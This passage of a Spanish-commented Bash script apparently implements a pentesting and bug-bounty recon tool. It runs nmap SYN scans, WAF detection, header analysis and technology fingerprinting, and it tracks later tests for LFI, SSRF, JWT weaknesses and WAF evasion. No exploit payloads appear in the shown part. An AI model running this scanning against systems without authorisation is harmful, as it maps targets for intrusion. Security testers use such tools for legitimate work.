#!/usr/bin/env bash
#
# ╔══════════════════════════════════════════════════════════════╗
# ║   WriestTavo v2.0 :: by WRIΞSTTAV0                           ║
# ║   Bug Bounty | Pentesting | Análisis de Vulnerabilidades     ║
# ║                                                              ║
# ║   MÓDULOS:                                                   ║
# ║   [1] TTL / OS Fingerprinting                                ║
# ║   [2] Port Discovery (Fast SYN)                              ║
# ║   [3] Service & Version Fingerprinting                       ║
# ║   [4] Web Recon  (whatweb, nikto, gobuster)                  ║
# ║   [5] Subdomain Enumeration  (subfinder / amass)             ║
# ║   [6] WAF Detection  (wafw00f)                               ║
# ║   [7] HTTP Headers Analysis                                  ║
# ║   [8] SMB Enumeration  (enum4linux-ng)                       ║
# ║   [9] Vulnerability Scan  (nmap vuln + searchsploit)         ║
# ║  [10] Reporte HTML profesional                               ║
# ╚══════════════════════════════════════════════════════════════╝

set -uo pipefail

# ─── COLORES ────────────────────────────────────────────────────
C_RST="\e[0m";   C_RED="\e[31m";   C_GRN="\e[32m"
C_YEL="\e[33m";  C_BLU="\e[34m";   C_CYN="\e[36m"
C_PUR="\e[35m";  C_BOLD="\e[1m";   C_DIM="\e[2m"

# ─── CONFIGURACIÓN GLOBAL ───────────────────────────────────────
TARGET=""
OUTPUT_DIR="wriestTavo_results"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
OPEN_PORTS_CSV=""
WEB_PORTS=()
SCAN_MODE="normal"   # normal | stealth | aggressive
REPORT_FILE=""
FINDINGS=()

# ════════════════════════════════════════════════════════════════
# ESTADO INTELIGENTE v4.0 — RETROALIMENTACIÓN TOTAL
# Cada módulo escribe aquí. Los siguientes leen y se adaptan.
# ════════════════════════════════════════════════════════════════

# ── Infraestructura base ──
INTEL_OS=""                    # linux | windows | unknown
INTEL_WAF_DETECTED=false
INTEL_WAF_NAME=""
INTEL_SCAN_DELAY=0

# ── Stack de aplicación ──
INTEL_CMS=""                   # wordpress | joomla | drupal | magento
INTEL_FRAMEWORK_JS=""          # react | nextjs | vue | nuxt | angular | svelte | astro | remix
INTEL_FRAMEWORK_BACKEND=""     # laravel | symfony | django | flask | fastapi | nestjs | express | aspnet | dotnetcore | rails
INTEL_TECHNOLOGIES=()          # php, nodejs, python, java, ruby, golang...
INTEL_SERVICES=()
INTEL_SUBDOMAINS=()
INTEL_WORDLIST_EXTRA=""

# ── Endpoints y URLs ──
INTEL_INJECTABLE_URLS=()       # URLs con parámetros para probar
INTEL_API_ENDPOINTS=()         # Endpoints API descubiertos
INTEL_SENSITIVE_PATHS=()       # Rutas sensibles encontradas
INTEL_FRAMEWORK_ROUTES=()      # Rutas específicas del framework detectado

# ── Tokens y secretos ──
INTEL_JWT_TOKENS=()            # JWTs encontrados en JS/headers/responses
INTEL_JS_SECRETS=()            # Secrets en JS
INTEL_API_KEYS=()              # API keys encontradas

# ── APIs ──
INTEL_GRAPHQL_URL=""
INTEL_SWAGGER_URL=""
INTEL_OPENAPI_ENDPOINTS=()     # Endpoints parseados de Swagger/OpenAPI

# ── Estado de vulns encontradas ──
INTEL_SQLI_FOUND=false
INTEL_XSS_FOUND=false
INTEL_LFI_FOUND=false
INTEL_LFI_PARAM=""             # Parámetro vulnerable a LFI
INTEL_LFI_URL=""               # URL vulnerable a LFI
INTEL_SSRF_FOUND=false
INTEL_SSRF_URL=""
INTEL_SSTI_FOUND=false
INTEL_CORS_VULN=false
INTEL_CORS_ORIGIN=""           # Origen aceptado (para PoC CSRF)
INTEL_NOSQLI_FOUND=false
INTEL_JWT_ALG_NONE=false       # true si alg:none funciona
INTEL_JWT_WEAK_SECRET=""       # Secret crackeado si se encontró
INTEL_DOCKER_EXPOSED=false     # Puerto 2375/2376 abierto
INTEL_K8S_EXPOSED=false        # Dashboard K8s expuesto
INTEL_NIKTO_FINDINGS=""

# ── Cloud ──
INTEL_CLOUD_PROVIDER=""        # aws | gcp | azure | cloudflare | ""
INTEL_BEHIND_CDN=false
INTEL_XXE_FOUND=false           # true si se confirmó XXE
INTEL_IDOR_FOUND=false          # true si se detectó IDOR potencial
INTEL_OPEN_REDIRECT_FOUND=false # true si se confirmó open redirect
INTEL_IIS_SHORTNAME=false       # true si IIS ShortName vulnerable
INTEL_WEBDAV=false              # true si WebDAV habilitado

intel_log() {
    echo -e "${C_PUR}  [INTEL]${C_RST} $1"
}

# Función helper: agregar URL a lista si no existe
intel_add_url() {
    local arr_name="$1" url="$2"
    local arr_ref="${arr_name}[@]"
    for existing in "${!arr_ref}"; do
        [[ "$existing" == "$url" ]] && return
    done
    eval "${arr_name}+=("\${url}")"
}

trap 'echo -e "\n\n${C_YEL}[!] Abortado por el usuario.${C_RST}"; exit 1' INT

# ─── UTILS ──────────────────────────────────────────────────────
log()    { echo -e "${C_BLU}[*]${C_RST} $1"; }
ok()     { echo -e "${C_GRN}[+]${C_RST} $1"; }
warn()   { echo -e "${C_YEL}[!]${C_RST} $1"; }
err()    { echo -e "${C_RED}[-]${C_RST} $1"; }
tip()    { echo -e "${C_PUR}[TIP]${C_RST} $1"; }
cmd_show(){ echo -e "  ${C_DIM}CMD:${C_RST} ${C_CYN}$1${C_RST}\n"; }

# add_finding SEVERITY TITLE DETAIL [CVSS] [REMEDIATION] [NEXT_STEP]
add_finding() {
    local sev="$1" title="$2" detail="$3"
    local cvss="${4:-}"
    local remediation="${5:-}"
    local next_step="${6:-}"
    # Auto-assign CVSS if not provided
    if [[ -z "$cvss" ]]; then
        case "$sev" in
            "CRÍTICO") cvss="9.0-10.0" ;;
            "ALTO")    cvss="7.0-8.9"  ;;
            "MEDIO")   cvss="4.0-6.9"  ;;
            "BAJO")    cvss="0.1-3.9"  ;;
            *)         cvss="N/A"      ;;
        esac
    fi
    # Auto-assign remediation if not provided
    if [[ -z "$remediation" ]]; then
        case "$sev" in
            "CRÍTICO") remediation="Corregir de inmediato. Notificar al equipo de seguridad." ;;
            "ALTO")    remediation="Planificar corrección en el próximo sprint/ciclo." ;;
            "MEDIO")   remediation="Incluir en backlog de seguridad con prioridad media." ;;
            "BAJO")    remediation="Revisar en la siguiente auditoría." ;;
            *)         remediation="Documentar y evaluar según política interna." ;;
        esac
    fi
    FINDINGS+=("${sev}|||${title}|||${detail}|||${cvss}|||${remediation}|||${next_step}")
}

is_domain() {
    [[ "$1" =~ ^[a-zA-Z] ]] && return 0 || return 1
}

is_web_port() {
    local p="$1"
    [[ "$p" == "80" || "$p" == "443" || "$p" == "8080" || "$p" == "8443" || "$p" == "8000" || "$p" == "8888" || "$p" == "8888" || "$p" == "3000" || "$p" == "5000" ]]
}

# ─── BANNER ─────────────────────────────────────────────────────
show_banner() {
    clear
    echo -e "${C_BLU}"
    echo "  ██████████████████████████████████████████████████████"
    echo "  █                                                    █"
    echo "  █   WriestTavo v2.0  ::  WRIΞSTTAV0                  █"
    echo "  █   Bug Bounty | Pentesting | Vuln Analysis          █"
    echo "  █                                                    █"
    echo "  ██████████████████████████████████████████████████████"
    echo -e "${C_RST}"
    echo -e "  Target  : ${C_YEL}${TARGET}${C_RST}"
    echo -e "  Modo    : ${C_CYN}${SCAN_MODE}${C_RST}"
    echo -e "  Output  : ${C_CYN}${OUTPUT_DIR}/${C_RST}"
    echo -e "  Fecha   : ${C_DIM}${TIMESTAMP}${C_RST}"
    echo
}

# ─── VALIDACIONES ───────────────────────────────────────────────
check_root() {
    if [[ "${EUID}" -ne 0 ]]; then
        err "Se requiere sudo para escaneos SYN (-sS)."
        echo -e "  Uso: ${C_YEL}sudo $0 [opciones] <IP|dominio>${C_RST}"
        exit 1
    fi
}

check_deps() {
    local missing=()
    local tools=(ping nmap awk grep curl xsltproc)
    local optional=(whatweb nikto gobuster subfinder wafw00f enum4linux-ng searchsploit ffuf amass)

    echo -e "${C_BLU}[*] Verificando dependencias...${C_RST}"
    for cmd in "${tools[@]}"; do
        command -v "$cmd" >/dev/null 2>&1 || missing+=("$cmd")
    done

    if [[ ${#missing[@]} -gt 0 ]]; then
        err "Herramientas obligatorias faltantes: ${missing[*]}"
        echo -e "  Instala con: ${C_YEL}sudo apt install ${missing[*]}${C_RST}"
        exit 1
    fi

    echo -e "  ${C_GRN}Core tools OK${C_RST}"
    for cmd in "${optional[@]}"; do
        if command -v "$cmd" >/dev/null 2>&1; then
            echo -e "  ${C_GRN}[✓]${C_RST} $cmd"
        else
            echo -e "  ${C_YEL}[~]${C_RST} $cmd ${C_DIM}(opcional, no disponible)${C_RST}"
        fi
    done
    echo
}

preparar_directorio() {
    mkdir -p "${OUTPUT_DIR}"/{nmap,web,recon,exploits,screenshots}
    local safe_target
    safe_target=$(echo "$TARGET" | sed 's|[/:.]|_|g')
    REPORT_FILE="${OUTPUT_DIR}/reporte_${safe_target}_${TIMESTAMP}.html"
}

# ─── MÓDULO 1: TTL / OS ─────────────────────────────────────────
modulo_ttl_os() {
    log "MÓDULO 1: TTL / OS Fingerprinting"
    local ttl
    ttl=$(ping -c1 -W2 "$TARGET" 2>/dev/null | awk -F'ttl=' '/ttl=/{split($2,a," "); print a[1]; exit}')

    if [[ -z "${ttl}" ]]; then
        warn "Host no responde a ICMP ping. Continuando con -Pn."
        add_finding "INFO" "ICMP Bloqueado" "El host no responde a ping, posible firewall/filtrado ICMP."
        return
    fi

    local os="Desconocido"
    local color="$C_YEL"
    if   (( ttl <= 64  )); then os="Linux / Unix / Android"; color="$C_GRN"
    elif (( ttl <= 128 )); then os="Windows";                color="$C_CYN"
    elif (( ttl <= 255 )); then os="Cisco / Solaris / Otro"; color="$C_YEL"
    fi

    echo -e "  ${color}OS estimado: ${os} (TTL=${ttl})${C_RST}"
    tip "TTL real puede ser distinto por saltos de red. Úsalo como referencia."
    add_finding "INFO" "OS Fingerprinting (TTL)" "TTL=${ttl} → Probable SO: ${os}"
    # ── INTEL: guardar OS para módulos posteriores ──
    if   (( ttl <= 64  )); then INTEL_OS="linux"
    elif (( ttl <= 128 )); then INTEL_OS="windows"
    else                        INTEL_OS="other"
    fi
    intel_log "OS detectado → ${INTEL_OS} (influye en wordlists y técnicas)"
    echo
}

# ─── MÓDULO 2: PORT DISCOVERY ───────────────────────────────────
modulo_port_scan() {
    log "MÓDULO 2: Port Discovery (SYN Scan — 2 fases)"

    # ── Configuración por modo ──────────────────────────────────
    local min_rate_fast min_rate_full extra_flags top_ports
    case "$SCAN_MODE" in
        stealth)
            min_rate_fast=500;  min_rate_full=300
            extra_flags="-n -Pn -T2"; top_ports=500
            tip "Modo STEALTH: fase 1 = top-${top_ports} puertos (silencioso y rápido)."
            ;;
        aggressive)
            min_rate_fast=8000; min_rate_full=6000
            extra_flags="-n -Pn -T5"; top_ports=1000
            ;;
        *)  # normal
            min_rate_fast=3000; min_rate_full=2000
            extra_flags="-n -Pn -T4"; top_ports=1000
            ;;
    esac

    # ── FASE A: Top-ports (rápido, siempre corre) ───────────────
    echo -e "  ${C_CYN}▶ Fase A — Top ${top_ports} puertos (rápido)${C_RST}"
    local cmd_a="nmap ${extra_flags} -sS --open --top-ports ${top_ports} --min-rate ${min_rate_fast} ${TARGET}"
    cmd_show "$cmd_a"

    local nmap_out_a
    nmap_out_a=$(nmap ${extra_flags} -sS --open \
        --top-ports ${top_ports} --min-rate ${min_rate_fast} \
        "${TARGET}" 2>/dev/null)

    local puertos_a
    puertos_a=$(echo "${nmap_out_a}" | grep '^[0-9]' | cut -d'/' -f1)

    if [[ -n "$puertos_a" ]]; then
        local csv_a
        csv_a=$(echo "${puertos_a}" | paste -sd ',' -)
        ok "Fase A — Puertos encontrados: ${C_YEL}${csv_a}${C_RST}"
        echo "${nmap_out_a}" > "${OUTPUT_DIR}/nmap/phase_a_top_ports.txt"
    else
        warn "Fase A — 0 puertos en top-${top_ports}."
    fi

    # ── FASE B: Todos los puertos (background, opcional) ────────
    echo
    echo -e "  ${C_CYN}▶ Fase B — Escaneo completo -p- (65535 puertos)${C_RST}"
    echo -e "  ${C_YEL}  Esto puede tardar varios minutos.${C_RST}"
    echo -ne "  ${C_YEL}¿Ejecutar escaneo completo en segundo plano? [s/N]: ${C_RST}"
    read -r run_full

    local nmap_out_b=""
    local puertos_b=""
    if [[ "${run_full,,}" =~ ^(s|si|y|yes|1)$ ]]; then
        local cmd_b="nmap ${extra_flags} -sS --open -p- --min-rate ${min_rate_full} ${TARGET}"
        cmd_show "$cmd_b"
        local bg_file="${OUTPUT_DIR}/nmap/phase_b_fullscan.txt"
        nmap ${extra_flags} -sS --open -p- --min-rate ${min_rate_full} \
            "${TARGET}" > "${bg_file}" 2>/dev/null &
        local bg_pid=$!
        echo -e "  ${C_GRN}[PID ${bg_pid}] Escaneo completo corriendo en background.${C_RST}"
        echo -e "  ${C_DIM}  Resultado en: ${bg_file}${C_RST}"
        echo -e "  ${C_DIM}  Seguimiento: tail -f ${bg_file}${C_RST}"
        add_finding "INFO" "Escaneo Completo (background)" "PID=${bg_pid} → ${bg_file}"
    else
        warn "Escaneo completo omitido. Continuando con resultados de Fase A."
    fi

    # ── Consolidar puertos ──────────────────────────────────────
    local all_ports
    all_ports=$(echo -e "${puertos_a}\n${puertos_b}" | grep -v '^$' | sort -un)

    local nmap_out="${nmap_out_a}"

    local puertos_nl="$all_ports"

    if [[ -z "${puertos_nl}" ]]; then
        # Si vino una URL original, inferir puertos web desde el protocolo
        if [[ -n "$ORIGINAL_URL" ]]; then
            warn "nmap no detectó puertos abiertos. Infiriendo desde URL original..."
            if [[ "$ORIGINAL_URL" =~ ^https:// ]]; then
                WEB_PORTS=(443); OPEN_PORTS_CSV="443"
            else
                WEB_PORTS=(80);  OPEN_PORTS_CSV="80"
            fi
            ok "Puerto web asumido: ${C_YEL}${OPEN_PORTS_CSV}${C_RST} (basado en ${ORIGINAL_URL})"
            add_finding "INFO" "Puertos Web (inferidos)" "nmap bloqueado por firewall/CDN. Usando puerto ${OPEN_PORTS_CSV} desde URL."
        else
            err "0 puertos abiertos encontrados."
            add_finding "INFO" "Sin puertos abiertos" "No se detectaron puertos TCP abiertos en el target."
            return
        fi
    else
        OPEN_PORTS_CSV=$(echo "${puertos_nl}" | paste -sd ',' -)
        ok "Puertos abiertos: ${C_YEL}${OPEN_PORTS_CSV}${C_RST}"
        add_finding "INFO" "Puertos TCP Abiertos" "${OPEN_PORTS_CSV}"

        # Detectar puertos web para módulos posteriores
        while IFS= read -r p; do
            is_web_port "$p" && WEB_PORTS+=("$p")
        done <<< "${puertos_nl}"
    fi

    echo
    echo "${nmap_out}" > "${OUTPUT_DIR}/nmap/port_discovery.txt"
}

# ─── MÓDULO 3: SERVICE & VERSION ────────────────────────────────
modulo_version_scan() {
    [[ -z "$OPEN_PORTS_CSV" ]] && warn "Sin puertos para escanear. Saltando módulo 3." && return

    log "MÓDULO 3: Service & Version Fingerprinting"
    local base="${OUTPUT_DIR}/nmap/${TARGET//\//_}_version"

    local cmd="nmap -n -Pn -sV -sC -vv --min-rate 2000 -p${OPEN_PORTS_CSV} -oA ${base} ${TARGET}"
    cmd_show "$cmd"

    nmap -n -Pn -sV -sC -vv --min-rate 2000 -p"${OPEN_PORTS_CSV}" -oA "${base}" "${TARGET}" 2>/dev/null

    # Parsear servicios del XML para el reporte
    if [[ -f "${base}.xml" ]]; then
        local services
        services=$(grep -oP 'portid="\K[^"]+|name="\K[^"]+|product="\K[^"]+|version="\K[^"]+' "${base}.xml" 2>/dev/null | paste - - - - | head -20)
        [[ -n "$services" ]] && add_finding "INFO" "Servicios Detectados" "<pre>${services}</pre>"
        xsltproc "${base}.xml" -o "${base}.html" 2>/dev/null && ok "HTML: ${base}.html"

        # ── INTEL: extraer servicios y tecnologías ──
        local nmap_txt="${base}.nmap"
        if [[ -f "$nmap_txt" ]]; then
            # Detectar OS real por servicios (más preciso que TTL)
            grep -qi "microsoft\|windows\|smb\|iis" "$nmap_txt" && INTEL_OS="windows" && intel_log "OS confirmado → Windows (por servicios)"
            grep -qi "openssh\|apache\|nginx\|ubuntu\|debian\|centos" "$nmap_txt" && INTEL_OS="linux" && intel_log "OS confirmado → Linux (por servicios)"

            # Detectar tecnologías web
            grep -qi "php" "$nmap_txt"    && INTEL_TECHNOLOGIES+=("php")    && intel_log "PHP detectado"
            grep -qi "python\|flask\|django\|wsgi" "$nmap_txt" && INTEL_TECHNOLOGIES+=("python") && intel_log "Python detectado"
            grep -qi "node\|express\|npm" "$nmap_txt" && INTEL_TECHNOLOGIES+=("nodejs") && intel_log "Node.js detectado"
            grep -qi "java\|tomcat\|jboss\|spring" "$nmap_txt" && INTEL_TECHNOLOGIES+=("java") && intel_log "Java/Tomcat detectado → XXE probable en SOAP/REST XML"
            grep -qi "axis\|cxf\|metro\|soap\|wsdl" "$nmap_txt" && INTEL_TECHNOLOGIES+=("soap") && intel_log "SOAP WebService → XXE muy probable"
            grep -qi "iis" "$nmap_txt"   && INTEL_TECHNOLOGIES+=("iis")    && intel_log "IIS detectado → Windows server"
            grep -qi "apache" "$nmap_txt" && INTEL_TECHNOLOGIES+=("apache") && intel_log "Apache detectado"
            grep -qi "nginx" "$nmap_txt"  && INTEL_TECHNOLOGIES+=("nginx")  && intel_log "Nginx detectado"
            grep -qi "mysql\|mariadb" "$nmap_txt" && INTEL_TECHNOLOGIES+=("mysql") && intel_log "MySQL detectado → probar SQLi en web"
            grep -qi "postgresql" "$nmap_txt" && INTEL_TECHNOLOGIES+=("postgresql") && intel_log "PostgreSQL detectado"
            grep -qi "mongodb" "$nmap_txt" && INTEL_TECHNOLOGIES+=("mongodb") && intel_log "MongoDB detectado → posible NoSQLi"
            grep -qi "redis" "$nmap_txt"   && INTEL_TECHNOLOGIES+=("redis") && intel_log "Redis expuesto → verificar auth"
            grep -qi "elasticsearch" "$nmap_txt" && INTEL_TECHNOLOGIES+=("elasticsearch") && intel_log "Elasticsearch → posible data exposure"
            grep -qi "jenkins" "$nmap_txt" && INTEL_TECHNOLOGIES+=("jenkins") && add_finding "ALTO" "Jenkins Detectado" "Jenkins expuesto. Verifica autenticación y CVEs como CVE-2019-1003000."
            grep -qi "wordpress\|wp-" "$nmap_txt" && INTEL_CMS="wordpress" && intel_log "WordPress detectado vía nmap"

            # Guardar listado de servicios para searchsploit inteligente
            while IFS= read -r svc_line; do
                [[ -n "$svc_line" ]] && INTEL_SERVICES+=("$svc_line")
            done < <(grep -E "^[0-9]+/tcp.*open" "$nmap_txt" 2>/dev/null | head -20)

            intel_log "Servicios registrados: ${#INTEL_SERVICES[@]}"
        fi
    fi
    echo
}

# ─── MÓDULO 4: WAF DETECTION ────────────────────────────────────
modulo_waf() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    command -v wafw00f >/dev/null 2>&1 || { warn "wafw00f no disponible. Instala: sudo apt install wafw00f"; return; }

    log "MÓDULO 4: WAF Detection"
    local proto="http"
    local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"

    local url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local cmd="wafw00f ${url} -o ${OUTPUT_DIR}/web/waf_detection.txt"
    cmd_show "$cmd"

    local waf_out
    waf_out=$(wafw00f "${url}" 2>/dev/null)
    echo "${waf_out}" > "${OUTPUT_DIR}/web/waf_detection.txt"

    if echo "${waf_out}" | grep -qi "is behind"; then
        local waf_name
        waf_name=$(echo "${waf_out}" | grep -i "is behind" | head -1)
        warn "WAF DETECTADO: ${waf_name}"
        add_finding "MEDIO" "WAF Detectado" "${waf_name} — Ajusta tu estrategia de evasión."
        tip "Con WAF activo usa --scan-delay en nmap y wordlists más pequeñas en gobuster."
        # ── INTEL: WAF activo → ajustar velocidad y técnicas ──
        INTEL_WAF_DETECTED=true
        INTEL_WAF_NAME="${waf_name}"
        INTEL_SCAN_DELAY=500
        intel_log "WAF activo → módulos web usarán delay ${INTEL_SCAN_DELAY}ms y headers de evasión"
        intel_log "SQLi y XSS usarán payloads con evasión de WAF automáticamente"
    else
        ok "No se detectó WAF."
        add_finding "INFO" "WAF" "No se detectó WAF activo. El target puede ser más permisivo."
        INTEL_WAF_DETECTED=false
        INTEL_SCAN_DELAY=0
    fi
    echo
}

# ─── MÓDULO 5: HTTP HEADERS ANALYSIS ────────────────────────────
modulo_http_headers() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return

    log "MÓDULO 5: HTTP Security Headers Analysis"
    local proto="http"
    local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local url="${ORIGINAL_URL:-${proto}://${TARGET}:${port}}"

    cmd_show "curl -skI --max-time 10 ${url}"

    local headers
    headers=$(curl -skI --max-time 10 "${url}" 2>/dev/null)
    echo "${headers}" > "${OUTPUT_DIR}/web/http_headers.txt"

    if [[ -z "$headers" ]]; then
        warn "No se pudo conectar a ${url}"
        return
    fi

    echo "${headers}" | head -5
    echo

    # Analizar headers de seguridad
    local missing_headers=()
    local security_issues=""

    declare -A SEC_HEADERS=(
        ["Strict-Transport-Security"]="Previene downgrade a HTTP (HSTS)"
        ["X-Frame-Options"]="Protege contra Clickjacking"
        ["X-Content-Type-Options"]="Previene MIME sniffing"
        ["Content-Security-Policy"]="Mitiga XSS y data injection"
        ["X-XSS-Protection"]="Filtro XSS del navegador"
        ["Referrer-Policy"]="Controla información del Referer"
        ["Permissions-Policy"]="Controla acceso a APIs del navegador"
    )

    for header in "${!SEC_HEADERS[@]}"; do
        if echo "${headers}" | grep -qi "^${header}:"; then
            echo -e "  ${C_GRN}[✓]${C_RST} ${header}"
        else
            echo -e "  ${C_RED}[✗]${C_RST} ${header} ${C_DIM}→ ${SEC_HEADERS[$header]}${C_RST}"
            missing_headers+=("$header")
            security_issues+="<li><b>${header}</b>: ${SEC_HEADERS[$header]}</li>"
        fi
    done

    if [[ ${#missing_headers[@]} -gt 0 ]]; then
        add_finding "BAJO" "Security Headers Faltantes (${#missing_headers[@]})" "<ul>${security_issues}</ul>"
    fi

    # Detectar info sensible en headers
    if echo "${headers}" | grep -qi "server:"; then
        local server_header
        server_header=$(echo "${headers}" | grep -i "^server:" | head -1)
        warn "Header Server expuesto: ${server_header}"
        add_finding "BAJO" "Server Header Expuesto" "${server_header} — Revela tecnología del servidor."
    fi

    if echo "${headers}" | grep -qi "x-powered-by:"; then
        local xpb
        xpb=$(echo "${headers}" | grep -i "x-powered-by:" | head -1)
        warn "X-Powered-By expuesto: ${xpb}"
        add_finding "BAJO" "X-Powered-By Header Expuesto" "${xpb} — Revela stack tecnológico."
    fi
    echo
}

# ─── MÓDULO 6: WEB TECH FINGERPRINTING ──────────────────────────
modulo_whatweb() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    command -v whatweb >/dev/null 2>&1 || { warn "whatweb no disponible."; return; }

    log "MÓDULO 6: Web Technology Fingerprinting (whatweb)"
    local proto="http"
    local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local url="${ORIGINAL_URL:-${proto}://${TARGET}}"

    cmd_show "whatweb -a 3 ${url} --log-brief=${OUTPUT_DIR}/web/whatweb.txt"

    local ww_out
    ww_out=$(whatweb -a 3 "${url}" 2>/dev/null)
    echo "${ww_out}" | tee "${OUTPUT_DIR}/web/whatweb.txt"

    if [[ -n "$ww_out" ]]; then
        add_finding "INFO" "Web Technologies (whatweb)" "<pre>${ww_out}</pre>"

        # ── INTEL: detectar CMS, frameworks y tecnologías ──
        echo "$ww_out" | grep -qi "wordpress"  && INTEL_CMS="wordpress"  && intel_log "WordPress detectado → usando wordlist WP en gobuster"
        echo "$ww_out" | grep -qi "joomla"     && INTEL_CMS="joomla"     && intel_log "Joomla detectado → usando wordlist Joomla"
        echo "$ww_out" | grep -qi "drupal"     && INTEL_CMS="drupal"     && intel_log "Drupal detectado → usando wordlist Drupal"
        echo "$ww_out" | grep -qi "magento"    && INTEL_CMS="magento"    && intel_log "Magento detectado → e-commerce, buscar credenciales admin"
        echo "$ww_out" | grep -qi "shopify"    && INTEL_CMS="shopify"    && intel_log "Shopify detectado"
        echo "$ww_out" | grep -qi "php"        && INTEL_TECHNOLOGIES+=("php")
        echo "$ww_out" | grep -qi "laravel"    && INTEL_TECHNOLOGIES+=("laravel") && intel_log "Laravel detectado → buscar .env, debug mode"
        # ── Frontend frameworks ──
        echo "$ww_out" | grep -qi "next.js\|nextjs\|_next"   && INTEL_FRAMEWORK_JS="nextjs"   && intel_log "Next.js → rutas /_next/, /api/, SSR"
        echo "$ww_out" | grep -qi "nuxt"                        && INTEL_FRAMEWORK_JS="nuxt"     && intel_log "Nuxt.js → rutas /_nuxt/, /api/"
        echo "$ww_out" | grep -qi "gatsby\|___gatsby"          && INTEL_FRAMEWORK_JS="gatsby"   && intel_log "Gatsby → rutas estáticas + /page-data/"
        echo "$ww_out" | grep -qi "astro\|_astro"              && INTEL_FRAMEWORK_JS="astro"    && intel_log "Astro → /dist/, SSR endpoints"
        echo "$ww_out" | grep -qi "svelte\|__svelte\|kit"     && INTEL_FRAMEWORK_JS="svelte"   && intel_log "SvelteKit → /.svelte-kit/, /api/"
        echo "$ww_out" | grep -qi "remix"                       && INTEL_FRAMEWORK_JS="remix"    && intel_log "Remix → /build/, loader endpoints"
        echo "$ww_out" | grep -qi "react\|data-reactroot"      && [[ -z "$INTEL_FRAMEWORK_JS" ]] && INTEL_FRAMEWORK_JS="react" && intel_log "React detectado"
        echo "$ww_out" | grep -qi "angular\|ng-version"        && [[ -z "$INTEL_FRAMEWORK_JS" ]] && INTEL_FRAMEWORK_JS="angular" && intel_log "Angular detectado"
        echo "$ww_out" | grep -qi "vue\|__vue"                 && [[ -z "$INTEL_FRAMEWORK_JS" ]] && INTEL_FRAMEWORK_JS="vue" && intel_log "Vue.js detectado"
        echo "$ww_out" | grep -qi "vite\|@vite"               && INTEL_TECHNOLOGIES+=("vite")  && intel_log "Vite detectado → buscar sourcemaps"
        echo "$ww_out" | grep -qi "jquery"     && INTEL_TECHNOLOGIES+=("jquery")
        echo "$ww_out" | grep -qi "bootstrap"  && INTEL_TECHNOLOGIES+=("bootstrap")
        # ── Backend frameworks ──
        echo "$ww_out" | grep -qi "x-powered-by.*asp\|asp.net\|aspnet" && INTEL_FRAMEWORK_BACKEND="aspnet"    && INTEL_TECHNOLOGIES+=("aspnet") && intel_log "ASP.NET → ViewState, trace.axd, YSOSERIAL"
        echo "$ww_out" | grep -qi "\.net core\|dotnet\|kestrel"        && INTEL_FRAMEWORK_BACKEND="dotnetcore" && INTEL_TECHNOLOGIES+=("dotnetcore") && intel_log ".NET Core → /swagger, /healthz, /metrics"
        echo "$ww_out" | grep -qi "django"                                 && INTEL_FRAMEWORK_BACKEND="django"    && intel_log "Django → /admin, debug toolbar, SSTI Jinja2"
        echo "$ww_out" | grep -qi "fastapi\|uvicorn"                      && INTEL_FRAMEWORK_BACKEND="fastapi"   && intel_log "FastAPI → /docs, /redoc, /openapi.json (auto-expuesto!)"
        echo "$ww_out" | grep -qi "flask\|werkzeug"                       && INTEL_FRAMEWORK_BACKEND="flask"     && intel_log "Flask → SSTI Jinja2, /console si debug activo"
        echo "$ww_out" | grep -qi "ruby.on.rails\|x-powered-by.*phusion"  && INTEL_FRAMEWORK_BACKEND="rails"    && intel_log "Rails → /rails/info, SSTI ERB"
        echo "$ww_out" | grep -qi "symfony"                                 && INTEL_FRAMEWORK_BACKEND="symfony"   && intel_log "Symfony → /_profiler, debug toolbar"
        echo "$ww_out" | grep -qi "nestjs\|nest.js"                        && INTEL_FRAMEWORK_BACKEND="nestjs"   && intel_log "NestJS → Swagger auto /api, /api-json"
        echo "$ww_out" | grep -qi "express\|x-powered-by.*express"         && INTEL_FRAMEWORK_BACKEND="express"  && intel_log "Express.js → /api/, prototype pollution"
        # ── Cloud providers ──
        echo "$ww_out" | grep -qi "cloudfront\|amazon\|aws"  && INTEL_CLOUD_PROVIDER="aws"        && intel_log "AWS/CloudFront → buscar IP real y S3 buckets"
        echo "$ww_out" | grep -qi "cloudflare"                  && INTEL_CLOUD_PROVIDER="cloudflare" && INTEL_BEHIND_CDN=true && intel_log "Cloudflare → intentar bypass IP real"
        echo "$ww_out" | grep -qi "azure\|microsoft.azure"     && INTEL_CLOUD_PROVIDER="azure"      && intel_log "Azure → buscar Storage Blobs públicos"
        echo "$ww_out" | grep -qi "vercel\|now\.sh"           && INTEL_CLOUD_PROVIDER="vercel"     && intel_log "Vercel → buscar .env en build output"
        echo "$ww_out" | grep -qi "netlify"                     && INTEL_CLOUD_PROVIDER="netlify"    && intel_log "Netlify → buscar _redirects, netlify.toml"
        # ── Construir rutas específicas del framework detectado ──
        _build_framework_routes

        # Elegir wordlist según CMS detectado
        case "$INTEL_CMS" in
            wordpress)
                [[ -f "/usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt" ]] &&                     INTEL_WORDLIST_EXTRA="/usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt" &&                     intel_log "Wordlist WordPress activada para gobuster"
                add_finding "ALTO" "WordPress Detectado" "Ejecutar: <code>wpscan --url ${url} --enumerate u,p,t --api-token TU_TOKEN</code>"
                ;;
            joomla)
                [[ -f "/usr/share/seclists/Discovery/Web-Content/CMS/joomla.txt" ]] &&                     INTEL_WORDLIST_EXTRA="/usr/share/seclists/Discovery/Web-Content/CMS/joomla.txt" &&                     intel_log "Wordlist Joomla activada"
                add_finding "ALTO" "Joomla Detectado" "Ejecutar: <code>joomscan --url ${url}</code>"
                ;;
            drupal)
                [[ -f "/usr/share/seclists/Discovery/Web-Content/CMS/drupal.txt" ]] &&                     INTEL_WORDLIST_EXTRA="/usr/share/seclists/Discovery/Web-Content/CMS/drupal.txt"
                add_finding "ALTO" "Drupal Detectado" "Ejecutar: <code>droopescan scan drupal -u ${url}</code>"
                ;;
        esac

